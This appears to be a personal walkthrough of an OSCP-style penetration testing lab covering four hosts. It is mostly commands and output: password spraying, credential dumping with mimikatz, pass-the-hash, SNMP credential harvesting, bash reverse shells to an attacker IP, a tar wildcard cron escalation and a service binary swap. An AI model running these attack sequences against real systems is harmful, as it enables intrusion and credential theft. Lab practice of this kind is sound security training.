



## .153 

```bash

# port 8000
# Fuzz
/partner/db

# Dump db
sqlite3 db
.dump
	df5fb539ff32f7fde5f3c05d8c8c1a6e
	e7966b31d1cad8a83f12ecec236c384c
	7007296521223107d3445ea0db5a04f9
	26231162520c611ccabfb18b5ae4dff2
	
# Check crackstation!
7007296521223107d3445ea0db5a04f9	md5	ecorp
26231162520c611ccabfb18b5ae4dff2	md5	Freedom1

# Password spray
netexec winrm 192.168.247.153 -u info/usernames.txt -p info/passwords.txt --continue-on-success --local-auth
	WINRM   192.168.247.153 5985   MS01  MS01\support:Freedom1 (Pwn3d!)

# Use evil-winrm
evil-winrm -i 192.168.247.153 -u support -p Freedom1 

# Found sus file
C:\Users\support\admintool.exe

# Transfer file to kali and search for strings
download C:\Users\support\admintool.exe /home/kali/Projects/Offsec/Challenges/OSCP_C/admintool.exe
strings admintool.exe > admintool.txt
cat admintool.txt | grep -i password
	administratorDecember31Enter administrator password:
	
# Add to info and spray again
netexec smb 192.168.247.153 -u administrator -p December31 --local-auth
	MS01\administrator:December31 (Pwn3d!)

impacket-psexec administrator:December31@192.168.247.153

# Stabalize the shell (Made me miss the PS history file cuz I could not read from psexec!)
cat C:\Users\administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
	C:\users\support\admintool.exe hghgib6vHT3bVWf cmd

# Add to info/passwords

# Spray again
# Found working creds for MS02
impacket-psexec administrator:hghgib6vHT3bVWf@10.10.207.154

# Upload mimikatz.exe
lput mimikatz.exe

# Run mimikatz.exe
	* Username : Administrator
	* NTLM : 59b280ba707d22e3ef0aa587fc29ffe5
	* Username : Administrator
	* NTLM : 507e8b20766f720619e9f33d73756b34
	
# Pass the hash for the DC
netexec smb 10.10.207.152 -u info/usernames.txt -H info/hashes.txt
	oscp.exam\administrator:59b280ba707d22e3ef0aa587fc29ffe5 (Pwn3d!)

impacket-psexec administrator@10.10.207.152 -hashes 00000000000000000000000000000000:59b280ba707d22e3ef0aa587fc29ffe5

# proof.txt
cat proof.txt
b905773ac79d0e21e6db62c126a23ebe


```


## .156 (Frankfurt)

```bash

# Run nmap
sudo nmap -p- -sS -sV -sC -Pn -v --open -oN nmap/156.nmap 192.168.208.156
	21/tcp   open  ftp      vsftpd 3.0.3
	22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
	25/tcp   open  smtp     Exim smtpd 4.90_1
	53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
	80/tcp   open  http     nginx
	110/tcp  open  pop3     Dovecot pop3d
	143/tcp  open  imap     Dovecot imapd (Ubuntu)
	465/tcp  open  ssl/smtp Exim smtpd 4.90_1
	587/tcp  open  smtp     Exim smtpd 4.90_1
	993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
	995/tcp  open  ssl/pop3 Dovecot pop3d
	2525/tcp open  smtp     Exim smtpd 4.90_1
	3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
	8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
	8083/tcp open  http     nginx
	8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)

# Do nmap UDP scan
	161/udp   open   snmp
	
# Fuzz web directories

# Potential attack vectors
Exim < 4.90.1 - 'base64d' Remote Code Execution 
	https://www.exploit-db.com/exploits/44571
	https://www.exploit-db.com/exploits/45671
	
SNMP

http://192.168.208.156/webmail/
	roundcube webmail
		https://www.exploit-db.com/exploits/40892
		https://github.com/t0kx/exploit-CVE-2016-9920

https://192.168.208.156:8083/login
	VestaCP 0.9.8-26 - 'LoginAs' Insufficient Session Validation 
		https://www.exploit-db.com/exploits/49219
	Vesta Control Panel Authenticated Remote Code Execution 
		https://www.rapid7.com/db/modules/exploit/linux/http/vestacp_exec/

# Ran snmpbulkwalk and found creds (Required to use capital J for jack)
snmpbulkwalk -c public -v2c 192.168.208.156 . > info/snmpwalk.156
cat info/snmpwalk.156 | grep -i pass
	jack:3PUKsX98BMupBiCf
	
# Login in https://192.168.208.156:8083/login
	Jack:3PUKsX98BMupBiCf
	
# Go to cron tab and add revshell
bash -c "/bin/bash -i >& /dev/tcp/192.168.45.152/1234 0>&1"
sudo rlwrap nc -nvlp 1234

# Found local.txt
cat local.txt
	5dda9282cd1201976782bc09412bf4ba
	
# Found other exploit to get root shell (Easy but intended PE)
https://ssd-disclosure.com/ssd-advisory-vestacp-multiple-vulnerabilities/

# Copy VestaFuncs.py and vestaROOT.py to kali and run
python3 vestaROOT.py https://192.168.208.156:8083 Jack 3PUKsX98BMupBiCf

whoami
	root
	
cat /root/proof.txt
	5817e18fa1c914adf7dcc6fedc3c78a1


```


## .157 (Charlie)

```bash

# nmap scan
sudo nmap -p- -sS -sV -sC -Pn -v --open -oN nmap/157nmap 192.168.208.157
	21/tcp    open  ftp     vsftpd 3.0.5
	22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
	80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
	20000/tcp open  http    MiniServ 1.820 (Webmin httpd)

# possible to login to ftp with anonymous
ftp 192.168.208.157
	anonymous:anonymous
	
# Download files from backup
# A bunch of PDF templates that holds no intresting info
# Check with exiftool
	Author                          : Cassie
	Author                          : Mark
	Author                          : Robert

# Found login form: https://192.168.208.157:20000/session_login.cgi
# However has bruteforce protection and user:user does not work for creds found
# Possible to login with cassie:cassie (ignore caps)

# Tried public exploits (Both fails)
https://www.exploit-db.com/exploits/50234
https://github.com/sergiovks/Usermin-1.820-Exploit-RCE-Authenticated/blob/main/userminRCE.py

# Possible to do rce via the webapp https://192.168.208.157:20000/shell/?xnavigation=1
# Insert revshell
bash -c "/bin/bash -i >& /dev/tcp/192.168.45.152/1234 0>&1"
sudo rlwrap nc -nvlp 1337
whoami
	cassie

# local.txt
cat local.txt
	5fdbe8cec6b36b1692f2fac854c16310

# Run linpeas

	SERVER_REALROOT=/usr/share/usermin
	MINISERV_CONFIG=/etc/usermin/miniserv.conf
	WEBMIN_VAR=/var/usermin
	
	Check Linux Exploit Suggester if nothing else works
	
	root        1050  0.0  0.1   6772  5144 ?        Ss   07:41   0:00 /usr/sbin/apache2 -k start

	roc 4137 with ppid 1017 is run by user cassie but the ppid user is root
	Proc 4201 with ppid 1017 is run by user cassie but the ppid user is root
	Proc 4265 with ppid 1017 is run by user cassie but the ppid user is root
	Proc 4331 with ppid 1 is run by user cassie but the ppid user is root
	Proc 4338 with ppid 4329 is run by user cassie but the ppid user is root
	
	Users with console
		cassie:x:1000:1000:CLWEB:/home/cassie:/bin/bash
		mark:x:1010:1010::/home/robert:/bin/bash
		robert:x:1010:1010::/home/robert:/bin/bash
		root:x:0:0:root:/root:/bin/bash
		
	# Cassie in adm group?
	uid=1000(cassie) gid=1000(cassie) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)	
	
	/var/log/apache2/access.log
	/var/log/apache2/error.log
	/home/cassie/.sudo_as_admin_successful
	
	#SGID
	/usr/bin/write.ul (Unknown SGID binary)
	
	

# Potential attack vectors for PE:

grep "CRON" /var/log/syslog
	Sep  4 11:50:33 oscp CRON[1423]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
	
# Exploit cronjob tar wildcard
https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa

# Create revshell
cat privesc.sh
#/bin/bash
bash -c "/bin/bash -i >& /dev/tcp/192.168.45.152/4444 0>&1"

# Transfer file to /opt/admin
wget http://192.168.45.152/exploits/privesc.sh

# Start nc
sudo rlwrap nc -nvlp 1337

# Create the 2 files that looks like tar flags to execute the script
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'

# Found proof.txt
cat /root/proof.txt
	af2c4ce348602124a2549a6e7f7e89c3


```


## .155 (Pascha)

```bash

# nmap
sudo nmap -p- -sS -sV -sC -Pn -v --open -oN nmap/155.nmap 192.168.208.155 
80/tcp    open  http    Microsoft IIS httpd 10.0
9099/tcp  open  unknown
9999/tcp  open  abyss?
35913/tcp open  unknown

# Mobile mouse on 9099 looks sus

# Found exploit
https://github.com/lof1sec/mobile_mouse_rce

# Create revshell with msfvenom

# Run exploit
python3 exploits/RCEmobilemouse.py --target 192.168.208.155 --file /exploits/revshell.exe --lhost 192.168.45.152

cat local.txt
	d30555612625bb22d024dd1bdfd9f1f2

# Run powerup
	ServiceName   : GPGOrchestrator
	Path          : "C:\Program Files\MilleGPG5\GPGService.exe"
	
# Do binary revshell swap
iwr 192.168.45.152:8080/exploits/revshell.exe -outfile revshell.exe
mv GPGService.exe GPGService.exe.old
mv revshell.exe GPGService.exe

# Start nc listener and restart the computer
sudo rlwrap nc -nvlp 1234
restart-computer
whoami
	nt authority\system
	
# Proof.txt
cat proof.txt
	a9c857e6dfcb014ad2805916aaeb2c19

```